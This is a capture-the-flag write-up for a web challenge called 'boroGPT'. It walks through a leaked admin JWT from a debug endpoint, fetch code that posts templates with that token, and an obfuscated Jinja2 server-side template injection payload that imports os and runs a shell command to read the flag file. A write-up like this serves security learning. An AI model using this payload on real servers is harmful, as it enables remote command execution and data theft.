# boroGPT

## Description

Introducing boroGPT, boroAI's cutting-edge large language model that will revolutionize the way you think about chatbots! Our engineers have been hard at work building the most secure, scalable, and enterprise-ready AI platform the world has ever seen!

https://mx7pk2qw9nr4slvt.boroctf.com/

## Solution Walkthrough

We can see several endpoints in the legacy code, so I visited `/api/v0/users` and `/api/v0/jwks` respectively.

![alt text](image.png)

`/api/v0/users`

```json
[
    {
        "email": "alice@borocorp.io",
        "id": 1,
        "role": "user",
        "username": "alice"
    },
    {
        "email": "bob@borocorp.io",
        "id": 2,
        "role": "user",
        "username": "bob"
    },
    {
        "email": "carol@borocorp.io",
        "id": 3,
        "role": "moderator",
        "username": "carol"
    },
    {
        "_note": "debug session token",
        "email": "admin@borocorp.io",
        "id": 4,
        "role": "admin",
        "sample_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlzcyI6ImJvcm9ncHQtZGV2In0.fdrRsBk-C-8VW3vE_NO8WxY7I0KeYIgWP31aZtTJlzFY-6iTOXV4ztoulDYt3yxGJg8xrbwHrSUJDXgraXj-o_O6Kta4kC9AfitfP6jNkvd7fXnko-5SeysIC9onI2Peqo5xZOgz3IDxU_hrYvYIhExb4V_r6pBeDSEOjj0zLuqzFpVhvBQfDf9NrV-xbcmvxbLzjrZribzVvO2E4WqU8I7dQn5tLbreUipKF8A7wzL_ZtPhT-Z5rErq9mSA59JX7S11z-Ai4BCL9UJLsQ-B-oGMWbKy9-Ex549cD_idxWmhetgnbv5M1r4LqHoBWE-Z80MOSX2uEWLo19B0z4vgGg",
        "username": "admin"
    }
]
```

`/api/v0/jwks`

```json
{
    "keys": [
        {
            "alg": "RS256",
            "e": "AQAB",
            "kid": "borogpt-key-v1",
            "kty": "RSA",
            "n": "npug_-n-aYTHAhguDSVmH1Y41L4T3P6zGO668aFlt869c54nzkCrH38z1uBCQd4VADsDS_0RluPvZxyRRTQnxrJvksN8mUV4WPvHdRnBT83JPZs2n15qAC_nTdtK37b6UNErORB8XAcK0SNfsg9d-xArqXIRop2EMR9yAmTqxPWhyYG_myrXLXWrnCIz0e8n1UzJGUwH88_IYljYomrdQXaz36x6kcCqEvNNolGx0tuv9d7R2m1YnYXvhYzSh8BlyKX0GFsQhDpyiHAYlCzFawrl6RA4KWO2ZcebINvvwlhozMBsQM0woUqUEIdAgM4n9fbMgoUf8pLPhDTRmeGPzw",
            "use": "sig"
        }
    ]
}
```

It is noticeable that `/api/v0/users` provided an admin JWT, while the information from `/api/v0/jwks` wasn't very useful. Now, only `/api/v0/render` is left unused.

Seeing that it requires inputting a template, it is clearly an SSTI (Server-Side Template Injection). However, no matter how I tried, I received no response.

```js
const devFetch = (endpoint, options = {}) => {
  return fetch(endpoint, {
    ...options,
    headers: {
      ...options.headers,
      "X-Dev-Mode": "true"
    }
  });
};

const getUsers = () => devFetch("/api/v0/users");
const renderTemplate = (template, token) => devFetch("/api/v0/render", {
  method: "POST",
  headers: { "Authorization": `Bearer ${token}` },
  body: JSON.stringify({ template })
});

const getJWKS = () => devFetch("/api/v0/jwks");

renderTemplate('{{7*7}}', 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlzcyI6ImJvcm9ncHQtZGV2In0.fdrRsBk-C-8VW3vE_NO8WxY7I0KeYIgWP31aZtTJlzFY-6iTOXV4ztoulDYt3yxGJg8xrbwHrSUJDXgraXj-o_O6Kta4kC9AfitfP6jNkvd7fXnko-5SeysIC9onI2Peqo5xZOgz3IDxU_hrYvYIhExb4V_r6pBeDSEOjj0zLuqzFpVhvBQfDf9NrV-xbcmvxbLzjrZribzVvO2E4WqU8I7dQn5tLbreUipKF8A7wzL_ZtPhT-Z5rErq9mSA59JX7S11z-Ai4BCL9UJLsQ-B-oGMWbKy9-Ex549cD_idxWmhetgnbv5M1r4LqHoBWE-Z80MOSX2uEWLo19B0z4vgGg')
```

```json
{"output":""}
```

Later, I discovered it was because the `Content-Type` was not set to `application/json`. After changing it to `application/json`, it successfully returned 49.

![alt text](image-1.png)

Finally, using the payload I prepared earlier from picoCTF `{{ self|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('\x5f\x5fbuiltins\x5f\x5f')|attr('get')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /flag.txt')|attr('read')()}}`, I successfully obtained the flag.

## Flag

```text
boroCTF{pub1ic_k3y_g0es_both_ways}
```
